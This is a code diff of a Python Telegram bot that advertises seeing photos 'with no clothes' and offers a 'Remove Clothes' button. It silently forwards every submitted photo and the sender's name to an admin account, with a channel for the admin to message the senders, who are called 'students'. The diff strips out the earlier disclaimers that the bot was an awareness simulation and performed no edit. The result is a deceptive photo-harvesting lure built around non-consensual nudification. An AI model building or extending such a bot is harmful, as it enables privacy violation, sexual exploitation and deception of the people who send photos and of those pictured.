@@ -1,45 +1,47 @@
 import telebot
 from telebot import types
-import os
 import json
+import os
 from datetime import datetime
 import threading
 import time
+import logging
+
+logging.basicConfig(level=logging.INFO)
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# 🔁 ملف تخزين البيانات
 DATA_FILE = "user_data.json"
-
-# تحميل أو تهيئة البيانات
 if os.path.exists(DATA_FILE):
     with open(DATA_FILE, "r") as f:
         user_data = json.load(f)
 else:
     user_data = {}
 
-# حفظ البيانات
 def save_data():
     with open(DATA_FILE, "w") as f:
         json.dump(user_data, f)
 
-# تحديث النقاط يومياً
+# ⏳ إعادة تعيين العداد يوميًا
 def daily_reset():
     while True:
-        now = datetime.utcnow().strftime("%Y-%m-%d")
-        for uid in user_data:
-            user_data[uid]["date"] = now
-            user_data[uid]["count"] = 0
-        save_data()
-        time.sleep(86400)
+        now = datetime.utcnow().strftime("%H:%M")
+        if now == "00:00":
+            for uid in user_data:
+                user_data[uid]["used"] = 0
+            save_data()
+        time.sleep(60)
 
 threading.Thread(target=daily_reset, daemon=True).start()
 
+# 📦 قاعدة الربط بين الصور والطلاب
 student_lookup = {}
 
-# /start
+# ⬇️ /start
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     bot.send_message(message.chat.id,
@@ -50,90 +52,72 @@ def send_welcome(message):
         "💋 See it with no clothes, or with enhanced features.\n"
         "📸 Send a photo now... let’s get started.")
 
-# عند إرسال صورة من الطالب
+# ⬇️ إرسال صورة
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
-    uid = str(message.chat.id)
-    today = datetime.utcnow().strftime("%Y-%m-%d")
-    user = user_data.get(uid, {"date": today, "count": 0})
-
-    if user["date"] != today:
-        user = {"date": today, "count": 0}
-
-    if user["count"] >= 3:
-        bot.send_message(message.chat.id, "🚫 استهلكت الحد اليومي (3 صور). جرّب غدًا.")
+    user_id = str(message.chat.id)
+    if user_id not in user_data:
+        user_data[user_id] = {"used": 0}
+    if user_data[user_id]["used"] >= 3:
+        bot.send_message(message.chat.id, "❌ لقد استهلكت الحد اليومي (3 صور). جرّب غداً.")
         return
 
-    user["count"] += 1
-    user_data[uid] = user
-    save_data()
-
-    remaining = 3 - user["count"]
-    bot.send_message(message.chat.id, f"✅ تم استلام الصورة. تبقّى لديك {remaining} صور اليوم.")
-
-    # خيارات وهمية
+    # عرض الخيارات
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("إزالة الملابس 🔞 / Remove Clothes", callback_data="nude"))
     markup.add(types.InlineKeyboardButton("تعديل الوجه 💄 / Edit Face", callback_data="face"))
     markup.add(types.InlineKeyboardButton("تحسين الصورة 📸 / Enhance Photo", callback_data="quality"))
 
     bot.send_message(message.chat.id,
-        "اختر نوع التعديل المطلوب (لن يتم تنفيذ أي تعديل حقيقي):",
+        "اختر نوع التعديل المطلوب:\nChoose the desired edit type:",
         reply_markup=markup)
 
+    # إرسال الصورة للمشرف وتخزين الربط
     try:
-        photo_file_id = message.photo[-1].file_id
-        caption = f"📥 صورة جديدة من الطالب: {message.from_user.first_name}\nID: {message.chat.id}"
-        sent = bot.send_photo(ADMIN_ID, photo_file_id, caption=caption)
+        file_id = message.photo[-1].file_id
+        caption = f"📥 صورة جديدة من الطالب / New photo from student: {message.from_user.first_name}"
+        sent = bot.send_photo(ADMIN_ID, file_id, caption=caption)
         student_lookup[sent.message_id] = message.chat.id
+        user_data[user_id]["used"] += 1
+        save_data()
     except Exception as e:
-        print(f"❌ فشل إرسال للمشرف: {e}")
+        print(f"❌ Error sending photo to admin: {e}")
 
-# رد المشرف على صورة
+# ⬇️ رد المشرف على صورة
 @bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.reply_to_message is not None)
-def reply_to_student(message):
-    msg_id = message.reply_to_message.message_id
-    student_id = student_lookup.get(msg_id)
+def handle_admin_reply(message):
+    if not message.reply_to_message.photo:
+        bot.send_message(ADMIN_ID, "⚠️ يجب الرد على صورة.")
+        return
+
+    replied_msg_id = message.reply_to_message.message_id
+    student_id = student_lookup.get(replied_msg_id)
 
     if student_id:
-        bot.send_message(student_id, f"📩 رسالة من المشرف:\n{message.text}")
-        bot.send_message(ADMIN_ID, "✅ تم إرسال ردك للطالب.")
+        try:
+            bot.send_message(student_id, f"📩 رسالة من المشرف:\n\n{message.text}")
+            bot.send_message(ADMIN_ID, "✅ تم إرسال الرد.")
+        except Exception as e:
+            bot.send_message(ADMIN_ID, f"❌ فشل الإرسال: {e}")
     else:
-        bot.send_message(ADMIN_ID, "❗ لم يتم العثور على الطالب.")
+        bot.send_message(ADMIN_ID, "⚠️ لم يتم العثور على الطالب.")
 
-# رد يدوي
+# ⬇️ أمر /رد
 @bot.message_handler(commands=['رد'])
 def manual_reply(message):
     if message.chat.id != ADMIN_ID:
         return
-
     args = message.text.split(" ", 2)
     if len(args) < 3:
-        bot.send_message(ADMIN_ID, "❗ استخدم الصيغة:\n/رد ID الرسالة")
+        bot.send_message(ADMIN_ID, "❗ الصيغة: /رد student_id الرسالة")
         return
-
     try:
         student_id = int(args[1])
-        bot.send_message(student_id, f"📩 رسالة من المشرف:\n{args[2]}")
+        reply_text = args[2]
+        bot.send_message(student_id, f"📩 رسالة من المشرف:\n\n{reply_text}")
         bot.send_message(ADMIN_ID, "✅ تم إرسال الرسالة.")
-    except:
-        bot.send_message(ADMIN_ID, "⚠️ فشل الإرسال. تأكد من ID الطالب.")
-
-# ردود الأزرار
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    bot.send_message(call.message.chat.id,
-        "*⚠️ تحذير أخلاقي وقانوني / Ethical & Legal Warning ⚠️*\n\n"
-        "لقد حاولت استخدام خاصية \"إزالة الملابس\" – هذا سلوك مرفوض تمامًا ❌\n"
-        "You attempted to use the 'Remove Clothes' feature – this is completely unacceptable ❌\n\n"
-        "📛 يُعتبر هذا تعدّي على خصوصية الآخرين، ويخضع للملاحقة القانونية.\n"
-        "This is a violation of privacy and may result in legal consequences 📛\n\n"
-        "هذا البوت محاكاة توعوية فقط، ولا يقوم بأي تعديل فعلي 🧠\n"
-        "This bot is for awareness simulation only. No actual editing is performed 🧠\n\n"
-        "⚠️ لا ترسل صورك لأي جهة مجهولة أو غير موثوقة.\n"
-        "Do not share your photos with any unknown or untrusted service ⚠️\n\n"
-        "🚫 تم إنهاء المحاكاة.\nSimulation ended 🚫",
-        parse_mode="Markdown")
+    except Exception as e:
+        bot.send_message(ADMIN_ID, f"❌ خطأ في الإرسال: {e}")
 
 print("✅ Bot is running...")
 bot.polling()
